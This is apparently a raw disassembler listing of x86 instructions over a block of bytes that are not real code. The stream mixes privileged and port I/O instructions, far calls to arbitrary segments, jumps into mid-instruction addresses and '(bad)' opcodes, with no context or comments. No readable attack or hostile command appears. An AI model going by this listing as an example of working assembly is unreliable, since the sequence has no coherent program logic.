  6bb204:	arpl   WORD PTR [eax],sp
  6bb206:	fldcw  WORD PTR [ebp-0x1]
  6bb209:	add    eax,0x2d91ca45
  6bb20e:	jno    0x6bb211
  6bb210:	stos   BYTE PTR es:[edi],al
  6bb211:	or     BYTE PTR [edx-0x7],cl
  6bb214:	rol    DWORD PTR [ecx],cl
  6bb216:	in     al,dx
  6bb217:	xchg   edx,eax
  6bb218:	or     BYTE PTR [eax-0x1c],ch
  6bb21b:	hlt    
  6bb21c:	sub    BYTE PTR [ebx-0x688b3ac8],cl
  6bb222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb223:	fnstcw WORD PTR [ebx+ebx*8+0x4a]
  6bb227:	dec    edi
  6bb228:	sahf   
  6bb229:	mul    BYTE PTR [eax-0x36]
  6bb22c:	popa   
  6bb22d:	mov    ecx,0x57449b58
  6bb232:	sti    
  6bb233:	pop    ecx
  6bb234:	stos   DWORD PTR es:[edi],eax
  6bb235:	mov    WORD PTR [ecx+0x1de3af0d],cs
  6bb23b:	mov    eax,ds:0xfb154b04
  6bb240:	jecxz  0x6bb24b
  6bb242:	push   ecx
  6bb243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bb244:	in     eax,0xd7
  6bb246:	out    0x6d,al
  6bb248:	xchg   DWORD PTR [ebp-0x6a08c754],esp
  6bb24e:	mov    ah,0xcf
  6bb250:	scas   al,BYTE PTR es:[edi]
  6bb251:	push   0xffffffd5
  6bb253:	lock sub eax,0x797af4b4
  6bb259:	jae    0x6bb287
  6bb25b:	in     al,0x3f
  6bb25d:	lahf   
  6bb25e:	xor    DWORD PTR [edx-0x58e4f6b6],ebp
  6bb264:	xchg   ebp,eax
  6bb265:	lds    ebx,FWORD PTR [eax]
  6bb267:	mov    BYTE PTR [eax-0x480bb133],bl
  6bb26d:	add    eax,0x860f91f2
  6bb272:	sub    eax,0x3c32b65f
  6bb277:	arpl   di,sp
  6bb279:	aas    
  6bb27a:	call   0x7b7c:0x36ed4769
  6bb281:	hlt    
  6bb282:	jae    0x6bb2eb
  6bb284:	je     0x6bb20a
  6bb286:	int3   
  6bb287:	repnz ss inc ecx
  6bb28a:	es jecxz 0x6bb2a2
  6bb28d:	sub    eax,0xb492fc6a
  6bb292:	mov    esi,0x22dc58eb
  6bb297:	daa    
  6bb298:	out    dx,eax
  6bb299:	hlt    
  6bb29a:	leave  
  6bb29b:	jle    0x6bb2f0
  6bb29d:	aam    0xb8
  6bb29f:	mov    ch,0x1f
  6bb2a1:	dec    esp
  6bb2a2:	leave  
  6bb2a3:	test   BYTE PTR [edi+eax*8],ch
  6bb2a6:	mov    BYTE PTR [edx+0x2a09abe2],dl
  6bb2ac:	adc    al,0x8
  6bb2ae:	cmp    al,0x36
  6bb2b0:	xchg   esi,eax
  6bb2b1:	mov    ch,0x2d
  6bb2b3:	call   0x1542729d
  6bb2b8:	out    dx,eax
  6bb2b9:	sub    al,0xe
  6bb2bb:	fsubp  st(5),st
  6bb2bd:	jbe    0x6bb2ec
  6bb2bf:	or     BYTE PTR [edx],bl
  6bb2c1:	xlat   BYTE PTR ds:[ebx]
  6bb2c2:	mov    dl,0x3c
  6bb2c4:	or     eax,0xc5b867b8
  6bb2c9:	dec    edx
  6bb2ca:	cs push ebx
  6bb2cc:	mov    ch,0xfc
  6bb2ce:	cmp    edi,DWORD PTR [esi+0x5c]
  6bb2d1:	div    DWORD PTR [edi+0x47]
  6bb2d4:	sub    dl,0xad
  6bb2d7:	xchg   DWORD PTR [ecx],esi
  6bb2d9:	sub    eax,0xc9f0e188
  6bb2de:	js     0x6bb2bc
  6bb2e0:	dec    ebp
  6bb2e1:	mov    BYTE PTR [ebx],ah
  6bb2e3:	sub    al,0x35
  6bb2e5:	sub    bl,BYTE PTR [ebx+0x2b]
  6bb2e8:	mov    dh,0x91
  6bb2ea:	inc    esi
  6bb2eb:	sahf   
  6bb2ec:	and    eax,0xb5a80d6a
  6bb2f1:	sbb    BYTE PTR [esi],bh
  6bb2f3:	in     al,dx
  6bb2f4:	lock and al,0x7d
  6bb2f7:	push   ecx
  6bb2f8:	sbb    ah,ch
  6bb2fa:	loope  0x6bb2f8
  6bb2fc:	ret    
  6bb2fd:	test   al,0x9c
  6bb2ff:	nop
  6bb300:	jecxz  0x6bb35e
  6bb302:	pop    ds
  6bb303:	adc    bh,BYTE PTR [ebx]
  6bb305:	xchg   ebp,eax
  6bb306:	sbb    eax,0x7fd93b9f
  6bb30b:	cwde   
  6bb30c:	dec    esp
  6bb30d:	mov    ah,0x89
  6bb30f:	icebp  
  6bb310:	test   BYTE PTR [ebx+edx*8-0x1],al
  6bb314:	mov    dl,0x4d
  6bb316:	mov    BYTE PTR [edx-0x5f],ah
  6bb319:	cmp    BYTE PTR [edi+ebx*2-0x3b],cl
  6bb31d:	add    eax,0x7cea91ca
  6bb322:	daa    
  6bb323:	mov    edi,0x879f5659
  6bb328:	xor    al,0x54
  6bb32a:	mov    BYTE PTR [edx-0x31],ch
  6bb32d:	xchg   ebx,eax
  6bb32e:	or     BYTE PTR [ecx+0x5a],cl
  6bb331:	or     esp,ecx
  6bb333:	sbb    al,BYTE PTR [eax+0x7a2d4eb8]
  6bb339:	mov    ebp,0x73b885b0
  6bb33e:	aaa    
  6bb33f:	pop    ecx
  6bb340:	adc    ecx,DWORD PTR [edi+0x5]
  6bb343:	std    
  6bb344:	jg     0x6bb2e4
  6bb346:	sbb    DWORD PTR [esi+0x17],ebp
  6bb349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb34a:	in     eax,0x8c
  6bb34c:	lahf   
  6bb34d:	mov    cl,0x7f
  6bb34f:	ret    
  6bb350:	jg     0x6bb38b
  6bb352:	fst    DWORD PTR [edx-0xa]
  6bb355:	dec    edx
  6bb356:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  6bb358:	inc    ebp
  6bb359:	jb     0x6bb2fe
  6bb35b:	cmp    dh,BYTE PTR [esi]
  6bb35d:	cmp    eax,0xc9168a68
  6bb362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb363:	pop    ds
  6bb364:	adc    edi,DWORD PTR [edi]
  6bb366:	xchg   esp,eax
  6bb367:	xchg   ecx,eax
  6bb368:	(bad)  
  6bb369:	repz pop esi
  6bb36b:	pop    ecx
  6bb36c:	mov    WORD PTR [eax-0x7b],ss
  6bb36f:	push   0x3e
  6bb371:	jae    0x6bb325
  6bb373:	mov    ah,0xb1
  6bb375:	stos   DWORD PTR es:[edi],eax
  6bb376:	sub    DWORD PTR [ebp+0x2559995c],ebx
  6bb37c:	jno    0x6bb31e
  6bb37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb37f:	mov    esi,0x80484ff3
  6bb384:	adc    bl,ah
  6bb386:	mov    edx,0x97fa269f
  6bb38b:	ret    0x21f7
  6bb38e:	xchg   edx,eax
  6bb38f:	stos   BYTE PTR es:[edi],al
  6bb390:	mov    al,BYTE PTR [edx+0x75]
  6bb393:	and    ebp,DWORD PTR [edx+0x7065f3ad]
  6bb399:	shl    BYTE PTR [eax+esi*2],0x45
  6bb39d:	or     cl,ch
  6bb39f:	leave  
  6bb3a0:	jecxz  0x6bb37a
  6bb3a2:	mov    ebx,0x9834b437
  6bb3a7:	dec    ebp
  6bb3a8:	inc    BYTE PTR [ebp-0x1e4655c2]
  6bb3ae:	push   cs
  6bb3af:	mov    DWORD PTR [edi-0x68e5dcfd],eax
  6bb3b5:	aam    0x5d
  6bb3b7:	lods   eax,DWORD PTR ds:[esi]
  6bb3b8:	(bad)  
  6bb3b9:	enter  0xe4ca,0xe5
  6bb3bd:	sub    DWORD PTR [ecx-0x2f],eax
  6bb3c0:	ret    0xfbd7
  6bb3c3:	fiadd  DWORD PTR [ebp-0x3a]
  6bb3c6:	cmp    DWORD PTR [ecx+0x4c4245fb],0xe
  6bb3cd:	retf   
  6bb3ce:	or     dh,ah
  6bb3d0:	sbb    DWORD PTR [esi+0x77],ebp
  6bb3d3:	ss push es
  6bb3d5:	mov    cl,0xaf
  6bb3d7:	mov    ds:0x2396e006,al
  6bb3dc:	xor    BYTE PTR [ebp+0x1b],cl
  6bb3df:	xchg   esi,eax
  6bb3e0:	cdq    
  6bb3e1:	mov    ds:0xa532ca5d,eax
  6bb3e6:	leave  
  6bb3e7:	add    al,0xea
  6bb3e9:	jp     0x6bb3ca
  6bb3eb:	ins    BYTE PTR es:[edi],dx
  6bb3ec:	xor    dl,BYTE PTR [edx]
  6bb3ee:	call   0x5df9:0xa6600c2b
  6bb3f5:	cwde   
  6bb3f6:	rol    WORD PTR [edx+0x7a5184f0],cl
  6bb3fd:	pop    esp
  6bb3fe:	ss and al,0xbd
  6bb401:	push   esi
  6bb402:	imul   DWORD PTR [esi]
  6bb404:	pop    eax
  6bb406:	shl    BYTE PTR [ebp+edi*8+0x6d17b199],0xf8
  6bb40e:	sub    BYTE PTR [edx],0x6a
  6bb411:	into   
  6bb412:	mov    ebp,0xce915538
  6bb417:	mov    esp,?
  6bb419:	scas   al,BYTE PTR es:[edi]
  6bb41a:	inc    esi
  6bb41b:	jo     0x6bb413
  6bb41d:	(bad)  
  6bb41e:	push   edi
  6bb41f:	lds    edi,FWORD PTR [ebp-0x1f]
  6bb422:	cwde   
  6bb423:	add    BYTE PTR [edx],0x64
  6bb426:	stc    
  6bb427:	je     0x6bb462
  6bb429:	cld    
  6bb42a:	call   0xfa755122
  6bb42f:	mov    ch,0xd7
  6bb431:	sbb    al,0xc3
  6bb433:	pop    ecx
  6bb434:	out    dx,eax
  6bb435:	sti    
  6bb436:	and    esp,DWORD PTR [ebx-0x60e1924e]
  6bb43c:	int    0xc3
  6bb43e:	cdq    
  6bb43f:	mov    dl,0x65
  6bb441:	inc    esi
  6bb442:	mov    al,ds:0xc5c970c5
  6bb447:	push   cs
  6bb448:	bound  ecx,QWORD PTR [ebx]
  6bb44a:	sbb    DWORD PTR [ebp-0x65],ebx
  6bb44d:	call   0xf701007
  6bb452:	jb     0x6bb4af
  6bb454:	mov    al,ds:0xdf9dca8c
  6bb459:	mov    eax,ds:0x80338518
  6bb45e:	nop
  6bb45f:	loope  0x6bb42a
  6bb461:	aas    
  6bb462:	xlat   BYTE PTR ds:[ebx]
  6bb463:	repnz fiadd WORD PTR [edx]
  6bb466:	jl     0x6bb48c
  6bb468:	call   0x66296603
  6bb46d:	out    0xf6,eax
  6bb46f:	pop    edi
  6bb470:	call   0x3883243e
  6bb475:	xor    DWORD PTR [ebp-0x38065ad7],edx
  6bb47b:	or     ah,0xe4
  6bb47e:	scas   eax,DWORD PTR es:[edi]
  6bb47f:	cli    
  6bb480:	xor    eax,0x3b9fd509
  6bb485:	adc    edx,DWORD PTR [edi-0x26]
  6bb488:	pop    eax
  6bb489:	nop
  6bb48a:	sti    
  6bb48b:	jecxz  0x6bb4ae
  6bb48d:	and    al,0xbd
  6bb48f:	imul   ebx,DWORD PTR [ebp-0x70],0xdf2d9ce1
  6bb496:	jbe    0x6bb4a0
  6bb498:	jp     0x6bb4d4
  6bb49a:	sahf   
  6bb49b:	xor    bh,cl
  6bb49d:	aas    
  6bb49e:	dec    ebp
  6bb49f:	ret    0xd394
  6bb4a2:	enter  0x3a10,0xa1
  6bb4a6:	xor    BYTE PTR [ebx+0x24],0x26
  6bb4aa:	inc    eax
  6bb4ab:	jle    0x6bb43c
  6bb4ad:	jbe    0x6bb4c4
  6bb4af:	test   esp,edx
  6bb4b1:	push   ecx
  6bb4b2:	inc    esp
  6bb4b3:	jo     0x6bb4e4
  6bb4b5:	add    DWORD PTR [edx+0x55],ecx
  6bb4b8:	mov    edx,0xfbe80a29
  6bb4bd:	push   0x4415fbb0
  6bb4c2:	pop    es
  6bb4c3:	nop
  6bb4c4:	push   ecx
  6bb4c5:	cli    
  6bb4c6:	and    ecx,esp
  6bb4c8:	xor    edx,ebx
  6bb4ca:	mov    dl,0xbb
  6bb4cc:	push   ebp
  6bb4cd:	add    al,0xc7
  6bb4cf:	aam    0x2a
  6bb4d1:	pusha  
  6bb4d2:	or     ebp,DWORD PTR [eax+0x6917cd2a]
  6bb4d8:	lods   eax,DWORD PTR ds:[esi]
  6bb4d9:	cs icebp 
  6bb4db:	dec    ebp
  6bb4dc:	adc    al,0x4f
  6bb4de:	sbb    cl,dh
  6bb4e0:	sub    ecx,DWORD PTR [eax+0x330a09c6]
  6bb4e6:	and    al,0x3
  6bb4e8:	xor    al,BYTE PTR [ecx-0x503cfc20]
  6bb4ee:	mov    ecx,0x397c0f72
  6bb4f3:	sbb    eax,0x915d9bc4
  6bb4f8:	push   ss
  6bb4f9:	scas   al,BYTE PTR es:[edi]
  6bb4fa:	pop    eax
  6bb4fb:	or     eax,0xd52ac711
  6bb500:	rol    BYTE PTR [ebx+eax*1-0x10913099],1
  6bb507:	jmp    0x86bcba7c
  6bb50c:	adc    DWORD PTR [edx-0x321d27a1],edi
  6bb512:	test   DWORD PTR [eax+0xf92dfbd],edx
  6bb518:	sub    ebp,DWORD PTR [esi]
  6bb51a:	cmp    ch,ch
  6bb51c:	fist   DWORD PTR [edi]
  6bb51e:	sbb    eax,0xf6ae63f6
  6bb523:	add    eax,DWORD PTR [eax-0x47]
  6bb526:	push   ss
  6bb527:	ficom  DWORD PTR [esi]
  6bb529:	jne    0x6bb553
  6bb52b:	sbb    BYTE PTR [edx-0x15],al
  6bb52e:	loope  0x6bb549
  6bb530:	mov    WORD PTR ds:0x7a8b3b8a,gs
  6bb536:	lods   eax,DWORD PTR ds:[esi]
  6bb537:	add    al,0xd1
  6bb539:	xchg   ebp,eax
  6bb53a:	mov    bh,BYTE PTR [ebx+0x6d]
  6bb53d:	stc    
  6bb53e:	cmp    edi,ebp
  6bb540:	adc    ebx,esp
  6bb542:	shl    al,0x23
  6bb545:	jbe    0x6bb54f
  6bb547:	imul   esp,DWORD PTR [edi+0x4e],0x78
  6bb54b:	fbstp  TBYTE PTR [ebx+0x8]
  6bb54e:	xchg   DWORD PTR [edx],ebx
  6bb550:	shl    al,0xae
  6bb553:	sbb    BYTE PTR [ecx],dl
  6bb555:	fs push ss
  6bb557:	pop    es
  6bb558:	test   BYTE PTR [eax+0x1586f8cd],cl
  6bb55e:	imul   esi,DWORD PTR [ecx+eiz*2+0xbf46880],0x2c
  6bb566:	test   eax,0x78735cf3
  6bb56b:	cmp    eax,0xf82f5803
  6bb570:	aas    
  6bb571:	xor    al,0x11
  6bb573:	add    ebp,DWORD PTR [ebp+0x2a]
  6bb576:	test   DWORD PTR [esi-0x44],edi
  6bb579:	jecxz  0x6bb5c4
  6bb57b:	mov    ch,dh
  6bb57d:	pushf  
  6bb57e:	iret   
  6bb57f:	sbb    bl,BYTE PTR [edi+0x2f]
  6bb582:	adc    ebx,DWORD PTR [ebx-0x1c]
  6bb585:	scas   al,BYTE PTR es:[edi]
  6bb586:	shl    DWORD PTR [ebp-0x26],0xf9
  6bb58a:	cmp    DWORD PTR [esi+0x6b],edi
  6bb58d:	sbb    al,0x92
  6bb58f:	je     0x6bb58c
  6bb591:	ret    
  6bb592:	or     BYTE PTR [edi+eax*4+0x7a],cl
  6bb596:	jno    0x6bb5ee
  6bb598:	cld    
  6bb599:	fidivr DWORD PTR [ecx-0xdfa5302]
  6bb59f:	xchg   ebp,eax
  6bb5a0:	pop    ds
  6bb5a1:	and    esp,ebp
  6bb5a3:	aad    0xa5
  6bb5a5:	fdivr  QWORD PTR [ebx]
  6bb5a7:	data16 aaa 
  6bb5a9:	dec    ebp
  6bb5aa:	sbb    BYTE PTR [eax+0x61],bh
  6bb5ad:	and    ah,cl
  6bb5af:	nop
  6bb5b0:	ret    0xe56f
  6bb5b3:	push   ebp
  6bb5b4:	cdq    
  6bb5b5:	shl    ch,1
  6bb5b7:	ret    
  6bb5b8:	inc    esi
  6bb5b9:	int    0x7a
  6bb5bb:	pop    edi
  6bb5bc:	mov    WORD PTR [esi+0x1c3e1992],gs
  6bb5c2:	sbb    al,0x52
  6bb5c4:	add    ch,BYTE PTR [esi]
  6bb5c6:	jp     0x6bb587
  6bb5c8:	cmp    eax,0x9792aa3d
  6bb5cd:	adc    DWORD PTR [edx-0x18bece30],0x157bb141
  6bb5d7:	jg     0x6bb5dd
  6bb5d9:	int    0xb6
  6bb5db:	xchg   ebx,eax
  6bb5dc:	aas    
  6bb5dd:	out    dx,eax
  6bb5de:	cli    
  6bb5df:	fbld   TBYTE PTR [esi+edx*4]
  6bb5e2:	pop    ss
  6bb5e3:	test   al,0x45
  6bb5e5:	cmc    
  6bb5e6:	adc    al,dl
  6bb5e8:	(bad)  
  6bb5e9:	jge    0x6bb5e5
  6bb5eb:	int3   
  6bb5ec:	pop    es
  6bb5ed:	es add bl,bl
  6bb5f0:	jge    0x6bb5ae
  6bb5f2:	xchg   BYTE PTR [edx+eiz*2],dh
  6bb5f5:	dec    edx
  6bb5f6:	push   edi
  6bb5f7:	(bad)  
  6bb5f8:	clc    
  6bb5f9:	jg     0x6bb659
  6bb5fb:	jle    0x6bb5dd
  6bb5fd:	cmp    eax,0x5c53baf8
  6bb602:	jne    0x6bb618
  6bb604:	mov    ebx,0x9322b5d8
  6bb609:	mov    esi,DWORD PTR [ebp+0x5e]
  6bb60c:	mov    ah,0x2c
  6bb60e:	push   esi
  6bb60f:	adc    BYTE PTR [edi+ebp*2+0x759fa53d],0x77
  6bb617:	aam    0x41
  6bb619:	xchg   ch,al
  6bb61b:	aas    
  6bb61c:	xchg   BYTE PTR [ebx+ebp*4],dl
  6bb61f:	ficom  WORD PTR [edi]
  6bb621:	cwde   
  6bb622:	shl    ecx,1
  6bb624:	into   
  6bb625:	mov    esi,0x1d876c6b
  6bb62a:	push   0x7c90bd8d
  6bb62f:	data16 repnz out 0xae,al
  6bb633:	imul   edi,ebp,0x6dc7150a
  6bb639:	mov    ds:0x553e4b76,eax
  6bb63e:	mov    ecx,0xb60201da
  6bb643:	stos   DWORD PTR es:[edi],eax
  6bb644:	sub    dl,BYTE PTR [eax]
  6bb646:	out    0x78,eax
  6bb648:	mul    DWORD PTR [eax]
  6bb64a:	cmp    DWORD PTR [esp+ebp*8+0xe],esi
  6bb64e:	sub    eax,DWORD PTR ds:0x890ac7ae
  6bb654:	aad    0xaf
  6bb656:	fdivr  st(5),st
  6bb658:	fldenv [edx+0x62cfff81]
  6bb65e:	sub    al,0xbb
  6bb660:	or     bl,BYTE PTR [edi]
  6bb662:	in     eax,0xbc
  6bb664:	inc    DWORD PTR ds:0xefa52694
  6bb66a:	inc    ebx
  6bb66b:	por    mm7,QWORD PTR [ebx+0xc]
  6bb66f:	pop    edx
  6bb670:	xor    ch,BYTE PTR [edi+0x572c0b97]
  6bb676:	add    ah,BYTE PTR ds:0x13022d68
  6bb67c:	pop    ebx
  6bb67d:	aad    0x39
  6bb67f:	mov    al,ds:0x7c46f605
  6bb684:	sbb    al,0xcc
  6bb686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb687:	inc    eax
  6bb688:	mov    esi,0x55be95c8
  6bb68d:	fsubr  QWORD PTR [ebx+edi*1]
  6bb690:	adc    eax,DWORD PTR [ebx-0x23]
  6bb693:	(bad)  
  6bb694:	and    eax,0x24f8523f
  6bb699:	js     0x6bb662
  6bb69b:	bound  edi,QWORD PTR [ebp-0x13]
  6bb69e:	jp     0x6bb6d8
  6bb6a0:	int3   
  6bb6a1:	push   esi
  6bb6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bb6a4:	mov    edx,0xb867dba0
  6bb6a9:	add    al,0xd6
  6bb6ab:	test   eax,0x73d544ab
  6bb6b0:	cmp    eax,esp
  6bb6b2:	mov    dl,0xe3
  6bb6b4:	mov    al,ds:0x5b264a2a
  6bb6b9:	mov    al,ds:0x1c6f5d4
  6bb6be:	lods   eax,DWORD PTR ds:[esi]
  6bb6bf:	rcr    DWORD PTR [esi-0x3c],cl
  6bb6c2:	dec    esp
  6bb6c3:	iret   
  6bb6c4:	push   ebx
  6bb6c5:	dec    eax
  6bb6c6:	dec    ebp
  6bb6c7:	popf   
  6bb6c8:	pusha  
  6bb6c9:	ss jge 0x6bb6c4
  6bb6cc:	inc    esi
  6bb6cd:	retf   
  6bb6ce:	jg     0x6bb6cd
  6bb6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb6d1:	in     eax,0x5a
  6bb6d3:	pop    ecx
  6bb6d4:	add    eax,edi
  6bb6d6:	out    dx,eax
  6bb6d7:	xor    eax,0x8e9832f0
  6bb6dc:	fwait
  6bb6dd:	inc    esp
  6bb6de:	dec    edx
  6bb6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb6e0:	add    DWORD PTR [ebx],eax
  6bb6e2:	push   esp
  6bb6e3:	jb     0x6bb68a
  6bb6e5:	out    0x9d,al
  6bb6e7:	fcom   DWORD PTR [esp+edi*8]
  6bb6ea:	mov    esp,0xe5c3a87
  6bb6ef:	and    BYTE PTR [ebp+0x42],ah
  6bb6f2:	push   0x61db1141
  6bb6f7:	fiadd  DWORD PTR [esi+0x47f11566]
  6bb6fd:	scas   al,BYTE PTR es:[edi]
  6bb6fe:	nop
  6bb6ff:	sbb    BYTE PTR [edx-0x67be1645],0x15
  6bb706:	push   ecx
  6bb707:	daa    
  6bb708:	dec    ebx
  6bb709:	in     al,0xff
  6bb70b:	mov    al,BYTE PTR [esi-0x67]
  6bb70e:	xchg   ebx,eax
  6bb70f:	xor    BYTE PTR [edi-0x21],bh
  6bb712:	xor    edi,DWORD PTR [ebp+0x363b62ff]
  6bb718:	test   eax,0xbf8b3df6
  6bb71d:	xchg   dh,cl
  6bb71f:	popa   
  6bb720:	and    BYTE PTR [ecx-0x6a89d5b4],bl
  6bb726:	pop    ds
  6bb727:	lahf   
  6bb728:	lds    edx,FWORD PTR [ebx-0xe11a9fa]
  6bb72e:	jl     0x6bb6e6
  6bb730:	ss sbb eax,ebp
  6bb733:	push   es
  6bb734:	loopne 0x6bb790
  6bb736:	jecxz  0x6bb79b
  6bb738:	add    BYTE PTR [eax+0x4e],0x73
  6bb73c:	cmp    edx,ebp
  6bb73e:	and    eax,0x5f5da86f
  6bb743:	or     eax,0x46007b8e
  6bb748:	rep outs dx,BYTE PTR ds:[esi]
  6bb74a:	shl    DWORD PTR [ecx+ecx*2-0x4cbf4ff0],0x8c
  6bb752:	imul   esp,DWORD PTR [edx-0xa56b8cd],0x2a769325
  6bb75c:	scas   al,BYTE PTR es:[edi]
  6bb75d:	or     dh,BYTE PTR [eax-0x368aa51c]
  6bb763:	es in  al,0xab
  6bb766:	push   esi
  6bb767:	fild   WORD PTR [edi]
  6bb769:	popa   
  6bb76a:	into   
  6bb76b:	push   edi
  6bb76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb76d:	dec    edx
  6bb76e:	jle    0x6bb70f
  6bb770:	loop   0x6bb6fb
  6bb772:	pusha  
  6bb773:	loop   0x6bb7ad
  6bb775:	adc    al,0xa4
  6bb777:	add    al,0xb7
  6bb779:	ja     0x6bb702
  6bb77b:	inc    esi
  6bb77c:	int    0xc0
  6bb77e:	or     edi,eax
  6bb780:	clc    
  6bb781:	add    DWORD PTR [esi+0x22dffa13],esi
  6bb787:	cwde   
  6bb788:	sbb    BYTE PTR [eax+0x4f],dl
  6bb78b:	or     eax,DWORD PTR [edx-0x25b8a8ab]
  6bb791:	fwait
  6bb792:	out    dx,eax
  6bb793:	into   
  6bb794:	cli    
  6bb795:	scas   eax,DWORD PTR es:[edi]
  6bb796:	loope  0x6bb7e4
  6bb798:	lods   al,BYTE PTR ds:[esi]
  6bb799:	enter  0x5945,0xf2
  6bb79d:	jae    0x6bb7ba
  6bb79f:	ficom  WORD PTR [edi]
  6bb7a1:	imul   ebp,DWORD PTR [ebp-0xa],0xffffffe3
  6bb7a5:	dec    ebx
  6bb7a6:	sub    eax,DWORD PTR [ebx+edx*4-0x2c]
  6bb7aa:	sti    
  6bb7ab:	adc    ebx,0xffffffc1
  6bb7ae:	std    
  6bb7af:	pop    esp
  6bb7b0:	push   edi
  6bb7b1:	scas   eax,DWORD PTR es:[edi]
  6bb7b2:	pop    es
  6bb7b3:	nop
  6bb7b4:	adc    eax,0x50b3a48f
  6bb7b9:	or     al,0xc6
  6bb7bb:	push   cs
  6bb7bc:	pop    ss
  6bb7bd:	xchg   ebp,eax
  6bb7be:	and    eax,0xb6398bb0
  6bb7c3:	(bad)  [eax+0x37]
  6bb7c6:	int    0x1a
  6bb7c8:	retf   0xc1
  6bb7cb:	cmp    ebx,DWORD PTR [eax]
  6bb7cd:	mov    ch,0x71
  6bb7cf:	lahf   
  6bb7d0:	xchg   DWORD PTR [edi-0x17],esp
  6bb7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb7d4:	mov    eax,0x184fb9e4
  6bb7d9:	mov    edi,?
  6bb7db:	adc    cl,bl
  6bb7dd:	xor    bl,dl
  6bb7df:	push   ebx
  6bb7e0:	mov    al,ds:0xa711868c
  6bb7e5:	push   0xffffff93
  6bb7e7:	sub    BYTE PTR [esi+0x17fcd3a7],0x45
  6bb7ee:	xor    BYTE PTR [ebp+0x79710231],bl
  6bb7f4:	add    BYTE PTR [ebx+0x49d1b152],ah
  6bb7fa:	scas   al,BYTE PTR es:[edi]
  6bb7fb:	xor    DWORD PTR [ebx-0xa142c0],ebp
  6bb801:	jns    0x6bb7fb
  6bb803:	repz jno 0x6bb833
  6bb806:	dec    ebx
  6bb807:	pop    esi
  6bb808:	sub    ecx,DWORD PTR [ecx+0x76]
  6bb80b:	sbb    bh,BYTE PTR [ecx+0x0]
  6bb80e:	in     eax,0x90
  6bb810:	jnp    0x6bb832
  6bb812:	pusha  
  6bb813:	(bad)  
  6bb814:	pop    ecx
  6bb815:	daa    
  6bb816:	mov    cl,0x7a
  6bb818:	aam    0x7b
  6bb81a:	aaa    
  6bb81b:	imul   edi,DWORD PTR [edi+ecx*2],0xfc0e1621
  6bb822:	and    al,0x25
  6bb824:	in     eax,dx
  6bb825:	ret    0x678a
  6bb828:	xor    BYTE PTR [edi+edi*4+0x22],cl
  6bb82c:	mov    esp,0xacd01ff8
  6bb831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb832:	jge    0x6bb8a0
  6bb834:	cmp    BYTE PTR [edi],0x25
  6bb837:	aam    0xa9
  6bb839:	rcl    DWORD PTR [eax],1
  6bb83b:	or     al,0xd6
  6bb83d:	cs jg  0x6bb7cf
  6bb840:	icebp  
  6bb841:	pop    edx
  6bb842:	in     eax,dx
  6bb843:	in     al,dx
  6bb844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bb845:	inc    esi
  6bb846:	jecxz  0x6bb861
  6bb848:	xchg   BYTE PTR [edx+0x3b1447bd],al
  6bb84e:	data16 mov ah,0xff
  6bb851:	xor    BYTE PTR [ebx-0x48b311a1],dl
  6bb857:	nop
  6bb858:	scas   eax,DWORD PTR es:[edi]
  6bb859:	mov    DWORD PTR [edx-0x5d7a39cd],edi
  6bb85f:	(bad)  
  6bb860:	ins    DWORD PTR es:[edi],dx
  6bb861:	ficomp DWORD PTR [esi+0x10]
  6bb864:	inc    edx
  6bb865:	cwde   
  6bb866:	cld    
  6bb867:	inc    eax
  6bb868:	pop    ecx
  6bb869:	mov    ah,BYTE PTR ds:0x84196b36
  6bb86f:	xchg   ebp,eax
  6bb870:	es jb  0x6bb875
  6bb873:	sbb    eax,0x84814b66
  6bb878:	adc    esp,DWORD PTR [eax-0x5f]
  6bb87b:	test   DWORD PTR [eax-0x8],ecx
  6bb87e:	clc    
  6bb87f:	jmp    0x6bb8ab
  6bb881:	inc    edi
  6bb882:	into   
  6bb883:	or     bh,BYTE PTR [edi]
  6bb885:	xchg   edi,eax
  6bb886:	cmp    al,0xdc
  6bb888:	cwde   
  6bb889:	mov    esp,0x16c4a574
  6bb88e:	sub    eax,0xcd1ee690
  6bb893:	add    eax,0xd7269bb6
  6bb898:	inc    ebp
  6bb899:	mov    cl,0xdd
  6bb89b:	xchg   esp,eax
  6bb89c:	arpl   WORD PTR [eax+ebp*1],sp
  6bb89f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb8a0:	cdq    
  6bb8a1:	jle    0x6bb916
  6bb8a3:	xchg   ebp,eax
  6bb8a4:	fistp  DWORD PTR [edx-0xc]
  6bb8a7:	inc    BYTE PTR [eax+0x64]
  6bb8aa:	mov    cl,0xb5
  6bb8ac:	call   0xc7eb:0x2aa9f435
  6bb8b3:	mov    eax,ds:0xebb2776a
  6bb8b8:	mov    ecx,DWORD PTR [edi+0x7a]
  6bb8bb:	mov    ds,WORD PTR [ecx+ebp*8+0x12]
  6bb8bf:	(bad)  
  6bb8c0:	pop    edx
  6bb8c1:	out    0xc5,eax
  6bb8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb8c4:	loopne 0x6bb906
  6bb8c6:	push   cs
  6bb8c7:	stc    
  6bb8c8:	inc    esp
  6bb8c9:	add    al,0xdd
  6bb8cb:	mov    bh,0x52
  6bb8cd:	stos   DWORD PTR es:[edi],eax
  6bb8ce:	mov    eax,0xfc863798
  6bb8d3:	les    esp,FWORD PTR [ecx+0x5f6357fe]
  6bb8d9:	fisub  WORD PTR [edx+ebx*4]
  6bb8dc:	jns    0x6bb879
  6bb8de:	xchg   ebp,eax
  6bb8df:	sub    edi,DWORD PTR [ebx-0x67]
  6bb8e2:	or     al,0x5
  6bb8e4:	pop    ds
  6bb8e5:	sub    BYTE PTR [ebp-0x22],dl
